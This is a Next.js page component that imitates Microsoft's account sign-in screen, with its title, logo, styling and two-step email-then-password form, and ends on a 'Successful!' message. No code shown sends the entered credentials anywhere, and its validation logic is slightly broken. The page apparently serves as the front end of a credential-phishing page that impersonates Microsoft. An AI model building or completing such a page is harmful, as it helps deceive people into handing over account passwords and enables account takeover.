"use client"
// pages/index.tsx
import { useState } from 'react';
import Head from 'next/head';
import Image from 'next/image';

export default function Home() {
  const [view, setView] = useState('uname');
  const [unameVal, setUnameVal] = useState(false);
  const [pwdVal, setPwdVal] = useState(false);
  const [uname, setUname] = useState('');
  const [pwd, setPwd] = useState('');

  const unReq = "Enter a valid email address, phone number, or Skype name.";
  const pwdReq = "Please enter the password for your Microsoft account.";

  const validate = () => {
    if (view === "uname") {
      if (uname.trim() === "") {
        setUnameVal(false);
      } else {
        setUnameVal(true);
      }
    } else if (view === "pwd") {
      if (pwd.trim() === "") {
        setPwdVal(false);
      } else {
        setPwdVal(true);
      }
    }
  };

  const handleNext = () => {
    validate();
    if (unameVal) {
      setView('pwd');
    }
  };

  const handleSignIn = () => {
    validate();
    if (pwdVal) {
      setView('final');
    }
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="icon" href="favicon.ico" />
        <title>Sign in to your Microsoft account</title>
        <style>{`
          * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
          }
          html, body {
            background-color: #e2e5d3;
            color: #1b1b1b;
          }
          section {
            display: table-cell;
            vertical-align: middle;
            height: 100vh;
            width: 100rem;
            max-width: 100%;
          }
          .title {
            line-height: 1.75rem;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
          }
          .auth-wrapper {
            max-width: 440px;
            width: calc(100% - 40px);
            padding: 44px;
            margin: auto;
            margin-bottom: 28px;
            background-color: #fff;
            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            min-width: 320px;
          }
          .opts {
            padding: 10px 44px;
            max-width: 440px;
            cursor: pointer;
            margin: auto;
            background-color: #fff;
            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
          }
          .opts:hover {
            background-color: rgba(0, 0, 0, .1);
          }
          .input {
            padding: 4px 8px;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, .4);
            background-color: rgba(255, 255, 255, .4);
            height: 36px;
            outline: none;
            width: calc(100% - 20px);
          }
          .input:hover {
            border-color: #323232;
          }
          .input::placeholder {
            font-size: 15px;
          }
          .mb-0 {
            margin-bottom: 0;
          }
          a.link {
            text-decoration: none;
            color: #0067b8;
          }
          a:hover {
            text-decoration: underline !important;
            color: #666;
          }
          a:focus {
            border: 1px dotted #000;
            text-decoration: underline !important;
          }
          .btn {
            margin: 0 0 0 auto;
            display: block;
            background-color: #0067b8;
            color: #fff;
            border: 2px solid #0067b8;
            padding: 5px 30px;
            font-size: 15px;
            cursor: pointer;
          }
          .btn:hover {
            background-color: #005da6;
          }
          .has-icon {
            display: flex;
            gap: 5px;
            align-items: center;
          }
          .mb-16 {
            margin-bottom: 16px;
          }
          .has-icon .icon {
            display: inline-flex;
          }
          .footer {
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            overflow: visible;
            z-index: 99;
            clear: both;
            min-height: 28px;
            display: flex;
            flex-direction: row;
            gap: 10px;
            justify-content: end;
          }
          .footer a, .footer span {
            color: #000;
            font-size: 12px;
            line-height: 28px;
            margin-left: 8px;
            margin-right: 8px;
            text-decoration: none;
          }
          .footer span {
            font-size: 20px;
            line-height: 20px;
          }
          .footer a:hover {
            text-decoration: underline;
          }
          .d-none {
            display: none;
          }
          .back {
            border: none;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            background-color: unset;
            cursor: pointer;
          }
          .identity {
            display: inline-flex;
            gap: 5px;
          }
          .d-block {
            display: block;
          }
          .w-100 {
            width: 100%;
          }
          .back:hover {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, .1);
          }
          .mt-16 {
            margin-top: 16px;
          }
          .mb-16 {
            margin-bottom: 16px;
          }
          .error {
            color: var(--error) !important;
          }
          .error-inp {
            border-bottom-color: var(--error) !important;
          }
          .btn-group {
            text-align: right;
            width: 100%;
            margin: 16px 0;
          }
          .btn-group>.btn {
            display: inline;
          }
          .btn-group>.btn:not(:last-child) {
            margin-right: 5px;
          }
          .btn-sec {
            background-color: #b2b2b2;
            color: #000;
            border-color: #b2b2b2;
          }
          .btn-sec:hover {
            background-color: rgba(0, 0, 0, .3);
          }
          #btn_final:hover {
            text-decoration: underline;
          }
          .text-title {
            font-size: 1.5rem;
          }
          label.has-checkbox {
            display: inline-flex;
            align-items: center;
            gap: 5px;
          }
          .checkbox {
            width: 20px;
            height: 20px;
          }
          .p {
            font-weight: 400;
            font-size: 15px;
            margin: 16px 0;
          }
          .fs-13 {
            font-size: 13px;
          }
          #user_identity {
            font-size: 15px;
            color: #1b1b1b;
          }
          img {
            vertical-align: middle;
          }
          @media screen and (max-width:600px) {
            html, body {
              background-color: #fff;
            }
            .auth-wrapper {
              box-shadow: none !important;
              padding: 24px !important;
              width: unset !important;
              max-width: unset !important;
              margin: 0 30px !important;
            }
            .opts {
              box-shadow: none !important;
              padding: 8px 24px !important;
              border: 1px solid #999;
              max-width: calc(100% - 112px);
              margin: 12% auto !important;
            }
          }
          :root {
            --error: #e81123;
          }
        `}</style>
      </Head>
      <section id="section_uname" className={view === 'uname' ? 'd-block' : 'd-none'}>
        <form className="auth-wrapper" onSubmit={(e) => { e.preventDefault(); handleNext(); }}>
          <Image src="/ms.svg" alt="Microsoft Logo" width={26} height={26} />
          <h2 className="title">Sign in</h2>
          <div className="w-100 mb-16 mt-16">
            <input
              id="username"
              type="text"
              name="username"
              placeholder="Email, phone, or Skype"
              className={`input ${unameVal ? '' : 'error-inp'}`}
              value={uname}
              onChange={(e) => setUname(e.target.value)}
            />
          </div>
          {!unameVal && (
            <div className="w-100 mb-16 mt-16">
              <p className="p error" id="unReq">{unReq}</p>
            </div>
          )}
          <div className="btn-group">
            <button type="submit" id="next" className="btn">Next</button>
          </div>
          <div className="w-100 mb-16 mt-16">
            <a href="#" className="link">Sign-in options</a>
          </div>
        </form>
      </section>
      <section id="section_pwd" className={view === 'pwd' ? 'd-block' : 'd-none'}>
        <form className="auth-wrapper" onSubmit={(e) => { e.preventDefault(); handleSignIn(); }}>
          <Image src="/ms.svg" alt="Microsoft Logo" width={26} height={26} />
          <div className="identity mt-16 mb-16">
            <button type="button" className="back has-icon" aria-label="back" onClick={() => setView('uname')}>
              <Image src="/back.svg" alt="Back" width={20} height={20} />
            </button>
            <p id="user_identity">{uname}</p>
          </div>
          <div className="mb-16">
            <h2 className="title">Enter password</h2>
          </div>
          <div className="w-100 mb-16 mt-16">
            <input
              id="password"
              type="password"
              name="password"
              placeholder="Password"
              className={`input ${pwdVal ? '' : 'error-inp'}`}
              value={pwd}
              onChange={(e) => setPwd(e.target.value)}
            />
          </div>
          {!pwdVal && (
            <div className="w-100 mb-16 mt-16">
              <p className="p error" id="pwdReq">{pwdReq}</p>
            </div>
          )}
          <div className="w-100 mb-16 mt-16">
            <label htmlFor="pwd-check" className="has-checkbox fs-13">
              <input type="checkbox" name="keep-signed-in" id="pwd-check" className="checkbox" />
              <span>Keep me signed in</span>
            </label>
          </div>
          <div className="btn-group">
            <button type="submit" id="signin" className="btn">Sign in</button>
          </div>
          <div className="w-100 mb-16 mt-16">
            <a href="#" className="link">Forgot password?</a>
          </div>
        </form>
      </section>
      <section id="section_final" className={view === 'final' ? 'd-block' : 'd-none'}>
        <div className="auth-wrapper text-title text-center">Successful!</div>
      </section>
      <footer className="footer">
        <a href="#" className="link">Terms of use</a>
        <span>&middot;</span>
        <a href="#" className="link">Privacy & Cookies</a>
        <span>&middot;</span>
        <a href="#" className="link">...</a>
      </footer>
    </>
  );
}
